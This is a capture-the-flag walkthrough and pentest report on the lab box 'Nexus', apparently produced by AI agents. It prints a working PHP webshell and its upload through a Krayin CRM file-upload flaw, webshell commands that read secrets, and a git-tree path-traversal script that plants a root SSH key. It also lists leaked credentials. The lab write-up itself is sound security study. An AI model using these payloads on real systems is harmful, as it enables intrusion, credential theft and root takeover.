# HTB "Nexus" — Walkthrough & Penetration Testing Report

**Target:** $TARGET (`nexus.htb`, `git.nexus.htb`, `billing.nexus.htb`)
**Difficulty:** Easy
**OS:** Linux (Ubuntu, kernel 6.8.0-111-generic)
**Engagement dates:** 2026-10-01
**Status:** COMPLETE — user.txt and root.txt both captured

---

## 1. Executive Summary

Nexus is an easy-rated Linux box built around a three-vhost web stack: a static
marketing site (`nexus.htb`), a public Gitea instance (`git.nexus.htb`), and a
Krayin CRM / billing portal (`billing.nexus.htb`), all fronted by a single
nginx instance on port 80 (plus OpenSSH on port 22). The compromise chain
began with pure information disclosure — a publicly browsable Gitea repository
whose commit history leaked a database password, combined with a staff email
address harvested from the marketing site's careers page — which together
yielded valid Krayin CRM administrator credentials via password reuse. That
admin session was then used to exploit an authenticated arbitrary file upload
vulnerability in Krayin CRM (tracked here as CVE-2026-38526) to drop a PHP
webshell and obtain code execution as `www-data`. From there, a live (and
rotated) database credential pulled fresh from the application's `.env` file
turned out to be reused yet again as the `jones` system/SSH account's
password, yielding `user.txt`. Root was obtained by abusing a custom systemd
timer (`gitea-template-sync.timer`) that runs a root-owned Python script every
60 seconds to sync Gitea "template" repositories to disk; the script builds
file paths from raw `git ls-tree` output with zero sanitization, so a
maliciously crafted git tree (using `..` as a tree-entry name, which git's
plumbing layer does not forbid) let an authenticated Gitea user write an
arbitrary attacker SSH key into `/root/.ssh/authorized_keys`, granting direct
root SSH access and `root.txt`. The overarching theme of the box is credential
and secret reuse across layers (Git history -> web app -> OS account) compounded
by two insufficiently-sanitized trust boundaries (file upload validation in
Krayin, and git path handling in the custom sync script).

---

## 2. Attack Chain Timeline

| # | Stage | What | Result |
|---|-------|------|--------|
| 1 | Recon | Full TCP (`-p-`) + targeted `-sC -sV` nmap scan of $TARGET | Only 22/tcp (OpenSSH 9.6p1) and 80/tcp (nginx 1.24.0) open; UDP top-50 clean |
| 2 | Recon | Browsed `nexus.htb` root page / `whatweb` / manual review | Static marketing site; harvested `careers@nexus.htb` and hiring-manager email `j.matthew@nexus.htb` from the Careers job-posting modal |
| 3 | Recon | Wildcard-vhost behavior discovered (`doesnotexist123.nexus.htb` → 302 redirect), explaining why broad ffuf vhost fuzzing found nothing; real vhosts found via targeted content-clue guessing instead | Confirmed vhosts `git.nexus.htb` and `billing.nexus.htb` added to `/etc/hosts` |
| 4 | Recon | Browsed `git.nexus.htb` (Gitea v1.26.0), found public org `admin`, public repo `admin/krayin-docker-setup` with 2 commits | Repo openly browsable with no authentication |
| 5 | Recon | Reviewed commit history of `admin/krayin-docker-setup` | Commit `1615c465b7...` added `.env` containing `DB_PASSWORD=N27xh!!2ucY04` for DB user `krayin`; commit `9b817fa4e0...` later scrubbed the password to empty in the live `.env`, but the old value remained forever recoverable from history |
| 6 | Exploit | Credential-stuffed the Krayin CRM admin login (`billing.nexus.htb/admin/login`) with the leaked password against 6 candidate usernames | `j.matthew@nexus.htb` / `N27xh!!2ucY04` succeeded (302 → `/admin/dashboard`, confirmed via authenticated GET returning `<title>Dashboard</title>`) |
| 7 | Exploit | Exploited CVE-2026-38526 — authenticated arbitrary file upload via `/admin/tinymce/upload` — uploading `shell.php` disguised with `type=image/jpeg` | Webshell stored at `http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php`; `?cmd=id` confirmed RCE as `www-data` |
| 8 | Exploit | Used the webshell to `cat /var/www/krayin/.env` | Leaked the **live** (rotated) `DB_PASSWORD=y27xb3ha!!74GbR`, different from the historical Gitea-leaked value |
| 9 | Exploit | Password-reuse attempt: `ssh jones@$TARGET` with the live DB password | Successful SSH login as `jones` — **user.txt captured** |
| 10 | PrivEsc | Standard local-enum checklist as `jones` (sudo -l, SUID/SGID, getcap, cron) | All dead ends — no escalation path found via classic vectors |
| 11 | PrivEsc | `systemctl list-timers --all` / `list-units` enumeration | Discovered non-cron scheduled job `gitea-template-sync.timer` → `gitea-template-sync.service`, running `/etc/gitea/template-sync.py` as root every 60s |
| 12 | PrivEsc | Read/analyzed `template-sync.py` logic (syncs Gitea repos flagged `template:true` by flattening `git ls-tree -r HEAD` into file writes under a staging dir, with no path sanitization) | Identified a path-traversal arbitrary-file-write primitive reachable by any authenticated Gitea user |
| 13 | PrivEsc | Logged into Gitea as `jones` (same password as SSH, confirmed via API basic-auth), created a self-owned repo `pwn-template`, flagged it `template:true` | Repo ready to be targeted by the sync service |
| 14 | PrivEsc | Hand-crafted a malicious git tree with `git hash-object`/`git mktree`/`git commit-tree`: innermost blob = attacker SSH pubkey at path `root/.ssh/authorized_keys`, wrapped in 5 nested trees named `..` (staging path is 5 components deep) | Produced a commit whose `git ls-tree -r HEAD` resolves to `../../../../../root/.ssh/authorized_keys` |
| 15 | PrivEsc | Force-pushed the crafted commit to `pwn-template`'s `main` branch over Gitea's smart-HTTP protocol | Gitea's `receive-pack` accepted it with no `git fsck` rejection of the `..` tree entry |
| 16 | PrivEsc | Waited ≤60s for `gitea-template-sync.timer` to fire | `/var/log/template-sync.log` recorded `synced: ../../../../../root/.ssh/authorized_keys` — attacker pubkey written to root's authorized_keys as root |
| 17 | PrivEsc | `ssh -i pwn_key root@$TARGET` | Root shell obtained — **root.txt captured** |

---

## 3. Key Vulnerabilities Identified

### 3.1 Sensitive-data exposure via public Gitea commit history
- **Component:** Gitea v1.26.0 instance at `git.nexus.htb`, public repo `admin/krayin-docker-setup`
- **Description:** The repository's `.env` and `docker-compose.yml` were committed to a publicly-readable Gitea repo with a real database password (`DB_PASSWORD=N27xh!!2ucY04`) in the initial commit. A later commit scrubbed the password from the *current* file contents, but Gitea's unauthenticated commit-history/diff view still exposed the original secret indefinitely.
- **CVSS (estimate):** 7.5 (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (unauthenticated, network-reachable confidentiality loss of credentials)
- **Remediation:** Never commit secrets to version control, even temporarily. Rotate any credential that was ever committed (scrubbing the latest revision is not sufficient — history must be purged with `git filter-repo`/BFG and the credential rotated). Restrict the Gitea instance to authenticated/internal access only, or mark repositories containing infrastructure configuration as private.

### 3.2 Username/contact enumeration via public marketing site
- **Component:** `nexus.htb` static site, Careers job-posting modal
- **Description:** The careers modal exposed a named hiring-manager email (`j.matthew@nexus.htb`) in addition to the generic `careers@nexus.htb` alias. This directly supplied the username half of the credential-stuffing attack against Krayin CRM.
- **CVSS (estimate):** 3.1 (Low) — informational disclosure only, but was a necessary enabler of the next-stage attack chain.
- **Remediation:** Avoid publishing individual staff email addresses tied to privileged application accounts on public-facing marketing content; use role-based aliases only.

### 3.3 CVE-2026-38526 — Krayin CRM authenticated arbitrary file upload (RCE)
- **Component:** Krayin CRM, `/admin/tinymce/upload` endpoint (Laravel-based, PHP 8.3.6; exact Krayin version on target `[unconfirmed, candidate 2.2.x]` — no exposed composer.json/version endpoint found on the live target)
- **Description:** The TinyMCE image-upload endpoint accepts authenticated uploads and stores them under a public, directly web-accessible `storage/tinymce/` path without validating file extension or actual content type (a `.php` file with a spoofed `image/jpeg` MIME type was accepted and stored as-is). Requesting the stored file directly executes attacker-supplied PHP, yielding full RCE in the context of the web server user (`www-data`).
- **CVSS (estimate):** 9.9 (Critical) — as recorded on the blackboard (CWE-434: Unrestricted Upload of File with Dangerous Type); consistent with `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` given it requires only a low-privilege authenticated session and yields full code execution.
- **Remediation:** Enforce server-side allow-listing of file extensions and MIME types (not just client-declared `Content-Type`) for all upload endpoints; store uploaded files outside the webroot or in a location with PHP execution disabled; apply upstream Krayin CRM patches for this CVE.

### 3.4 Credential rotation without account-level password rotation (`.env` → SSH password reuse)
- **Component:** `/var/www/krayin/.env` live file + `jones` OS account
- **Description:** The live `DB_PASSWORD` in `.env` had been rotated from the Gitea-leaked value (`N27xh!!2ucY04` → `y27xb3ha!!74GbR`), but the new value was itself reused as the `jones` Linux/SSH account password. Any RCE in the web application (such as 3.3) therefore directly yields a valid interactive system account password.
- **CVSS (estimate):** 8.1 (High) — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` post-RCE lateral movement to a named OS account.
- **Remediation:** Never reuse application/service credentials as human OS account passwords. Use SSH key-based authentication for interactive accounts and disable password auth where not required. Store `.env` secrets with restrictive file permissions and treat any credential visible to the web application process as potentially compromised once RCE is achieved.

### 3.5 `gitea-template-sync.service` — path-traversal arbitrary root file write (local privilege escalation)
- **Component:** Custom root-owned script `/etc/gitea/template-sync.py`, triggered every 60 seconds by `gitea-template-sync.timer`/`gitea-template-sync.service` (systemd), reading from the local Gitea instance (`http://localhost:3000/api/v1/repos/search`, loopback-only per `ss -tlnp`)
- **Description:** For every Gitea repository flagged `template: true`, the script runs `git ls-tree -r HEAD` against the corresponding bare repository and, for each entry, computes `target = os.path.join(STAGING_DIR/owner/repo, filepath)` then writes the blob's content to `target` — all as root, with zero sanitization of `filepath`. Git's low-level plumbing (`git hash-object`, `git mktree`, `git commit-tree`) permits a tree entry literally named `..`, a constraint normally enforced only by porcelain commands like `git checkout`, so a crafted, force-pushed commit can produce a flattened `ls-tree -r` path such as `../../../../../root/.ssh/authorized_keys`. Any authenticated Gitea user can create and flag their own repository as a template, meaning **any Gitea account** (not just an admin) can trigger root-owned arbitrary file writes anywhere on the filesystem within 60 seconds.
- **CVSS (estimate):** 8.8 (High) — `AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` (local, low-privilege-authenticated trigger, full system compromise via root file write).
- **Remediation:** Never derive filesystem paths from untrusted repository content without canonicalizing and validating that the resolved path stays within the intended staging directory (e.g., resolve with `os.path.realpath` and verify it is a descendant of `STAGING_DIR` before writing, or reject any tree entry name containing `/`, `..`, or other path-traversal sequences). Do not run this kind of sync job as root — run it as a dedicated low-privilege service account with write access scoped only to the staging directory. Restrict who may flag a repository as a Gitea "template" if that flag drives privileged automation.

---

## 4. Command Log & Proof of Concepts

All commands below are the minimal reproduction steps; flags are redacted per
reporting convention (see Section 5/Flags for capture confirmation).

### 4.1 Recon
```bash
# Full TCP port sweep
nmap -p- --min-rate=1000 -T4 -oN nmap/allports.txt $TARGET

# Targeted service/version scan
nmap -sC -sV -p22,80 -oN nmap/services.txt $TARGET

# UDP top-50
nmap -sU --top-ports 50 -oN nmap/udp_top50.txt $TARGET

# Vhost discovery (wildcard caught most fuzzing — real vhosts found by content-clue guessing)
curl -s -H "Host: doesnotexist123.nexus.htb" http://$TARGET/ -D -   # confirms wildcard -> 302 nexus.htb

echo "$TARGET nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

### 4.2 Gitea commit-history credential leak
```bash
# Browse public repo + commit history (no auth required)
curl -s http://git.nexus.htb/admin/krayin-docker-setup
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/1615c465b74e5d7ad3162873382dd8b3869ca892.diff
# -> reveals DB_PASSWORD=N27xh!!2ucY04 in the first commit of .env
curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/9b817fa4e073d12fc43952acb09f3067b2f17adf.diff
# -> confirms the password was later scrubbed from the live file (but not from history)
```

### 4.3 Krayin CRM admin login (password reuse)
```bash
curl -s -c loot/cookies.txt http://billing.nexus.htb/admin/login -D -   # grab XSRF-TOKEN / session

curl -s -b loot/cookies.txt -c loot/cookies.txt \
  -H "X-XSRF-TOKEN: <url-decoded XSRF-TOKEN cookie value>" \
  -F "email=j.matthew@nexus.htb" -F "password=N27xh!!2ucY04" \
  http://billing.nexus.htb/admin/login -D -
# -> 302 Location: /admin/dashboard

curl -s -b loot/cookies.txt http://billing.nexus.htb/admin/dashboard
# -> <title>Dashboard</title>  (web/dashboard_authed.html)
```

### 4.4 CVE-2026-38526 exploitation (arbitrary file upload -> RCE)
```bash
curl -s -b loot/cookies.txt -c loot/cookies.txt \
  -H "X-XSRF-TOKEN: <url-decoded XSRF-TOKEN cookie value>" \
  -F "file=@exploits/shell.php;type=image/jpeg" \
  http://billing.nexus.htb/admin/tinymce/upload
# -> returns public path, e.g. /storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php

curl -s "http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php?cmd=id;hostname;uname+-a"
# -> uid=33(www-data) gid=33(www-data), hostname nexus, Linux 6.8.0-111-generic
```
`exploits/shell.php` content (minimal one-liner):
```php
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
```

### 4.5 Live `.env` leak -> SSH as jones (user.txt)
```bash
curl -s "http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php?cmd=cat+/var/www/krayin/.env"
# -> leaks live DB_PASSWORD=y27xb3ha!!74GbR (rotated from the Gitea-leaked value)

ssh jones@$TARGET
# password: y27xb3ha!!74GbR
id
# -> uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
cat /home/jones/user.txt
# -> <captured — see evidence: user.txt = [REDACTED-HTB-FLAG]>
```

### 4.6 PrivEsc dead ends (documented for completeness, no escalation found)
```bash
sudo -S -l                 # -> "Sorry, user jones may not run sudo on nexus."
find / -perm -4000 -o -perm -2000 2>/dev/null   # -> only stock Ubuntu SUID/SGID binaries
getcap -r / 2>/dev/null    # -> only stock ping/mtr-packet/snap-confine/gst-ptp-helper
cat /etc/crontab; ls /etc/cron.d/   # -> only stock Debian/Ubuntu jobs
```

### 4.7 `gitea-template-sync.service` path-traversal -> root (root.txt)
```bash
# Discovery
systemctl list-timers --all
systemctl cat gitea-template-sync.service gitea-template-sync.timer
cat /etc/gitea/template-sync.py      # (copy preserved at loot/template-sync.py)

# Exploitation — full automated PoC: exploits/gitea_template_sync_traversal.sh
ssh-keygen -t ed25519 -f pwn_key -N '' -C 'pwn@nexus'

curl -u jones:y27xb3ha!!74GbR -X POST http://git.nexus.htb/api/v1/user/repos \
  -d '{"name":"pwn-template","auto_init":true,"default_branch":"main"}'
curl -u jones:y27xb3ha!!74GbR -X PATCH http://git.nexus.htb/api/v1/repos/jones/pwn-template \
  -d '{"template":true}'

git init repo && cd repo
BLOB=$(git hash-object -w ../pwn_key.pub)
T1=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)
T2=$(printf '040000 tree %s\t.ssh\n' "$T1" | git mktree)
T3=$(printf '040000 tree %s\troot\n' "$T2" | git mktree)
CUR=$T3
for i in 1 2 3 4 5; do CUR=$(printf '040000 tree %s\t..\n' "$CUR" | git mktree); done
COMMIT=$(git commit-tree "$CUR" -m "template sync traversal payload")

git push -f http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/pwn-template.git "$COMMIT:refs/heads/main"

# Wait <=60s for gitea-template-sync.timer, then:
ssh -i pwn_key root@$TARGET
id
# -> uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
# -> <captured — see evidence: root.txt = [REDACTED-HTB-FLAG]>
```

---

## 5. Credentials & Artifacts

| Credential / Artifact | Value | Where found | Confirmed use |
|---|---|---|---|
| Krayin DB password (historical, leaked) | `N27xh!!2ucY04` (user `krayin`) | Gitea commit `1615c465b74e5d7ad3162873382dd8b3869ca892`, `admin/krayin-docker-setup` repo, `.env` | Worked as Krayin CRM admin login password (paired with `j.matthew@nexus.htb`) |
| Krayin CRM admin login | `j.matthew@nexus.htb` / `N27xh!!2ucY04` | Email: `nexus.htb` careers modal / hiring manager link. Password: as above | Confirmed — 302 to `/admin/dashboard`, verified with `web/dashboard_authed.html` + `loot/cookies.txt` |
| Krayin DB password (live, rotated) | `y27xb3ha!!74GbR` | `/var/www/krayin/.env`, read via webshell RCE as `www-data` | Confirmed working as `jones` SSH/system password |
| `jones` SSH/system account | `jones` / `y27xb3ha!!74GbR` | Password reuse of the live Krayin DB password | Confirmed via SSH login, `uid=1000(jones)` |
| Gitea account `jones` | same password as SSH (`y27xb3ha!!74GbR`) | Confirmed via Gitea API HTTP basic auth (`POST /user/login` / API calls) | Used to create and flag the `pwn-template` repo |
| Attacker SSH keypair | `loot/root_ssh_key` / `loot/root_ssh_key.pub` (ed25519, comment `pwn@nexus`) | Generated locally during exploitation | Public key written to `/root/.ssh/authorized_keys` via the path-traversal primitive; private key used for final root SSH login |
| Webshell | `exploits/shell.php` | Uploaded via CVE-2026-38526 | Stored server-side at `http://billing.nexus.htb/storage/tinymce/a4ab8ac1ced89d669e20772cec3d5563.php` |
| `GITEA_API_TOKEN` | `03ee55f6c67b8b6fd1720717500e3c753abce3fc` | `/etc/gitea/template-sync.conf` (root:git, mode 640) | Bonus finding only — readable only after root was already obtained; **not needed for the exploit chain** |
| `user.txt` | `[REDACTED-HTB-FLAG]` | `/home/jones/user.txt` | Captured |
| `root.txt` | `[REDACTED-HTB-FLAG]` | `/root/root.txt`, local copy `loot/root.txt` | Captured |
| IMAP placeholder creds | `IMAP_USERNAME=username1` / `IMAP_PASSWORD=password1` | `web/gitea_repo/env_current.txt` | Not real credentials — default/placeholder values, not exploited |

---

## Notes on Evidence Gaps

- The exact Krayin CRM version on the live target is `[unconfirmed, candidate 2.2.x]` — GLOBAL_CONTEXT.md states no composer.json or version-disclosure endpoint was found on the box itself; the CVE-2026-38526 identification and candidate version were derived from external vulnerability research, not from a directly observed version string.
- GLOBAL_CONTEXT.md and the Web/App Surface section assert that Gitea exposes "a public user `jones`" as a discoverable account (`web/git_headers.txt, web/git_body.txt`), but the saved `web/git_body.txt` evidence file only contains the generic Gitea landing page HTML and does not itself show a `jones` user/profile page. This specific sub-claim is marked **[needs verification]** — the broader fact that `jones` is a valid account is independently confirmed by the successful SSH and Gitea-API logins in stages 9/13 of the timeline, so it does not affect the validity of the attack chain, only the specific "found via public browsing" provenance.

---

## Report Confirmation

Report written to: `easy/Nexus/walkthrough.md`

This engagement fully compromised HTB "Nexus" (easy, Linux) end-to-end: a
publicly exposed Gitea commit history and a staff email leaked from the
marketing site combined via password reuse to yield Krayin CRM admin access;
an authenticated arbitrary file upload (CVE-2026-38526) in Krayin CRM gave
`www-data` RCE and a second, rotated credential from the live `.env`, which
was itself reused as the `jones` SSH password for `user.txt`; and a custom
`gitea-template-sync` systemd timer with an unsanitized git-tree-path file
write let any authenticated Gitea user plant a root SSH key, yielding
`root.txt`. One evidentiary gap was identified: the claim that Gitea publicly
exposed a `jones` user profile is not directly shown in the saved
`web/git_body.txt` file (flagged `[needs verification]` above) — it does not
affect the chain's validity since `jones`'s credentials were independently
confirmed via successful SSH and Gitea API logins. The exact Krayin CRM
version is also unconfirmed on-target (candidate 2.2.x only, from external
CVE research).

```agent-message
FROM: @Scribe_Agent
TO: @Orchestrator
PHASE: Reporting -> Complete
ACTION: Final report synthesized at easy/Nexus/walkthrough.md

MESSAGE / FINDINGS:
Nexus (easy, Linux) is fully rooted and documented. The three-stage chain is
complete and evidenced end-to-end: (1) Gitea commit-history credential leak
(DB_PASSWORD) plus a staff email harvested from the nexus.htb careers page
gave Krayin CRM admin access via password reuse; (2) CVE-2026-38526
(authenticated arbitrary file upload in Krayin CRM) delivered a PHP webshell
and www-data RCE, from which the live .env leaked a second, rotated DB
password that was itself reused as jones's SSH password, capturing user.txt;
(3) the custom gitea-template-sync.service/timer, which syncs Gitea "template"
repos to disk as root via unsanitized git ls-tree output, was abused with a
crafted git tree containing ".." tree-entry names to write an attacker SSH key
into /root/.ssh/authorized_keys, yielding root.txt. Two gaps remain open: the
exact Krayin CRM version is unconfirmed on-target (candidate 2.2.x only, from
external research, no composer.json/version endpoint observed), and the claim
that Gitea publicly exposed a browsable "jones" user profile is not directly
shown in the saved web/git_body.txt evidence (flagged [needs verification];
does not affect chain validity since jones's credentials were independently
confirmed via working SSH/API logins).

HANDOFF QUERY / TASK FOR RECIPIENT:
"Report ready for review. Optionally dispatch @Recon_Agent to re-confirm the
Krayin CRM version string and the public visibility of the jones Gitea account
for full evidentiary completeness, or close the engagement as-is."
```
